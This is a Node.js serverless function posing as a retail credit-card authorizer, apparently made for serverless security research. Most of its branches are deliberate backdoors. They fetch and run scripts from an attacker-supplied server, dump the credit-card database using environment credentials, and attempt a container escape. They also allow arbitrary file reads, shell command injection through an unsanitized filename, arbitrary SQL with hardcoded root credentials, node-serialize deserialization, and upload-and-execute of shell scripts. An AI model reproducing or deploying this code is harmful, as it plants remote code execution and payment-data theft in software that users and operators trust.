'use strict';

const fs = require('fs');
const child_process = require('child_process');
const malicious = require('./malicious');
const util = require('util');

const execFile = util.promisify(child_process.execFile);

const constants = {
	TABLE_CREDIT_CARDS_NAME: process.env.TABLE_CREDIT_CARDS_NAME,
	HOST: process.env.HOST,
	USER: process.env.USER,
	PASS: process.env.PASS,
	DBNAME: process.env.DBNAME
};

module.exports = async (event, context, callback) => {
	console.log(event);
	console.log("event:body");
	console.log(event.body);
	if (event.body.malicious == 'one') {
		console.log('Step 1: Downloading attack scripts');
		var downloadStatus = await malicious.downloadFile(event.body.attackserver, 'sqldump.sh');

		var response = {
			approved: 'false',
			failureReason: downloadStatus
		};
		callback(null, response);
	} else if (event.body.malicious == 'two') {
		console.log('Step 2: Exfiltration');

		if (fs.existsSync('./sqldump.sh')) {
			try {
				const { stdout, stderr } = await execFile('./sqldump.sh', [constants.HOST, constants.USER, constants.PASS, constants.DBNAME, constants.TABLE_CREDIT_CARDS_NAME]);

				var response = {
					approved: 'false',
					failureReason: {
						out: stdout,
						err: stderr
					}
				};
				callback(null, response);
			} catch (error) {
				console.log('Error with exec');
				console.log(error);
				var response = {
					approved: 'false',
					failureReason: 'Error executing sqldump.sh. Error: ' + error
				};
				callback(null, response);
			}
		} else {
			var response = {
				approved: 'false',
				failureReason: './sqldump.sh does not exist.'
			};
			callback(null, response);
		}
	} else if (event.body.malicious == 'sas6') {
		var path = event.body.path;
		try {
			const data = fs.readFileSync(path, 'utf8');
			console.log('文件内容:', data);
			var response = {
				data: data
			};
			callback(null, response);
		} catch (err) {
			console.error('读取文件时出错:', err);
			var response = {
				data: err
			};
			callback(null, response);
		}
	} else if (event.body.malicious == 'sas3') {
		var fileName = event.body.fileName;
		var response = { 'data': 'done' }
		child_process.execSync(`touch ${fileName}`);
		callback(null, response);
	} else if (event.body.malicious == 'escape_S1') { // zch
		console.log('Step 1: Downloading escape attack scripts');
		var downloadStatus = await malicious.downloadFile(event.body.attackserver, 'escape2.sh');

		var response = {
			approved: 'false',
			failureReason: downloadStatus
		};
		callback(null, response);
	} else if (event.body.malicious == 'escape_S2') { // zch
		console.log('Step 2: Exfiltration');
		if (fs.existsSync('./escape2.sh')) {
			try {
				const { stdout, stderr } = await execFile('/bin/sh', ['./escape2.sh']);
				// const { stdout, stderr } = await execFile('./escape2.sh');
				var response = {
					approved: 'false',
					failureReason: {
						out: stdout,
						err: stderr
					}
				};
				callback(null, response);
			} catch (error) {
				console.log('Error with exec');
				console.log(error);
				var response = {
					approved: 'false',
					failureReason: 'Error executing attack.sh. Error: ' + error
				};
				callback(null, response);
			}
		} else {
			var response = {
				approved: 'false',
				failureReason: './escape2.sh does not exist.'
			};
			callback(null, response);
		}
	} else if (event.body.malicious == 'readFiles') {
		/*var fileName = event.body.fileName;
		var response = { 'data': 'done'  , 'type' : 'read' }
		child_process.execSync(`touch ${fileName}`);
		callback(null, response);*/
		var filesToRead = event.body.fileName;
		//var filesToRead2 = event.body.fileName2; 
		Promise.all(filesToRead.map(file => {
			return new Promise((resolve, reject) => {
				fs.readFile(file, 'utf8', (err, data) => {
					if (err) {
						reject(`Error reading file ${file}: ${err}`);
					} else {
						resolve({ file, content: data });
					}
				});
			});
		}))
			.then(results => {
				callback(null, {
					approved: 'true',
					files: results
				});
			})
			.catch(err => {
				callback(null, {
					approved: 'false',
					failureReason: err
				});
			});
	} else if (event.body.malicious == 'sqlInjection') {
		var sqlQuery1 = event.body.sql1;
		var sqlQuery2 = event.body.sql2;
		const mysql = require('mysql');
		// 直接连接到 MySQL，无需启动服务  
		const connection = mysql.createConnection({
			host: 'cc-db',
			user: 'root',
			password: 'pass',
			database: 'helloRetail',
			connectTimeout: 10000 // 设置超时为 10 秒
		});

		connection.connect((error) => {
			if (error) {

				console.error('Error connecting to MySQL:', error);
				return callback(null, {
					approved: 'false',
					failureReason: 'Database connection failed: ' + error.message
				});
			}

			//const query = `SELECT * FROM creditCards;  `;   
			connection.query(sqlQuery1, (err, results) => {
				if (err) {
					connection.query(sqlQuery2, (error, answer) => {
						if (error) {
							console.error('SQL Error:', error);
							callback(null, { approved: 'false', error: err, failureReason: error.message });
						} else {
							callback(null, { approved: 'true', error: err, answer: answer });
							connection.end();
						}
					});
					/*console.error('SQL Error:', error);  
					callback(null, {  approved: 'false', error: err, failureReason: error.message  });  */
				} else {
					connection.query(sqlQuery2, (error, answer) => {
						if (error) {
							console.error('SQL Error:', error);
							callback(null, { approved: 'false', results: results, failureReason: error.message });
						} else {
							callback(null, { approved: 'true', results: results, answer: answer });
							connection.end();
						}
					});


				}
			});

			//connection.end();  
		});
	} else if (event.body.malicious == 'deserialize') {
		const s = require('node-serialize');
		const payload = event.body.payload;
		try {
			const result = s.unserialize(payload); // 反序列化  
			callback(null, { approved: 'true', type: typeof result });
		} catch (err) {
			callback(null, { approved: 'false', error: err, failureReason: err.message });
		}


	} else if (event.body.malicious == "uploadmaliciousfile") {
		// 确保上传路径存在  
		const uploadDir = './uploads';
		if (!fs.existsSync(uploadDir)) {
			fs.mkdirSync(uploadDir, { recursive: true });
		}

		// 获取文件名和内容  
		const fileName = event.body.fileName;
		const fileContent = event.body.fileContent;

		if (!fileName || !fileContent) {
			var response = {
				approved: 'false',
				failureReason: 'fileName and fileContent cannot be empty.'
			};
			callback(null, response);
			return;
		}

		// Ensure the file extension is .sh  
		if (!fileName.endsWith('.sh')) {
			var response = {
				approved: 'false',
				failureReason: 'Only .sh files are supported for execution.'
			};
			callback(null, response);
			return;
		}

		try {
			// 写入内容到指定的 .sh 文件  
			const filePath = `${uploadDir}/${fileName}`;
			fs.writeFileSync(filePath, fileContent, 'utf8');
			console.log(`File uploaded successfully: ${filePath}`);

			// 为脚本添加可执行权限  
			fs.chmodSync(filePath, '755');

			// 执行 .sh 文件并获取输出  
			// const { stdout, stderr } = child_process.execSync(`sh ${filePath}`, { encoding: 'utf8' });  
			const { stdout, stderr } = await execFile('/bin/sh', [filePath]);
			console.log('Script Execution Output:', stdout);
			console.error('Script Execution Error:', stderr);

			var response = {
				approved: 'true',
				message: `File ${fileName} executed successfully.`,
				output: stdout ? stdout.trim() : null,
				errors: stderr ? stderr.trim() : null
			};
			callback(null, response);
		} catch (error) {
			console.error('Error executing script:', error);

			var response = {
				approved: 'false',
				failureReason: `Error executing file: ${error.message}`
			};
			callback(null, response);
		}
	}
	else {
		var result = {};
		if (event.body.creditCard) {
			if (Math.random() < 0.01) { // Simulate failure in 1% of purchases (expected).
				result.approved = 'false';
				result.failureReason = 'Credit card authorization failed';
			} else {
				result.approved = 'true';
				result.authorization = Math.floor(Math.random() * Number.MAX_SAFE_INTEGER);
			}
			return callback(null, result);
		} else {
			var response = {
				approved: 'false',
				failureReason: 'Database access not implemented. Please supply creditCard in request.'
			};
			callback(null, response);
		}
	}
};
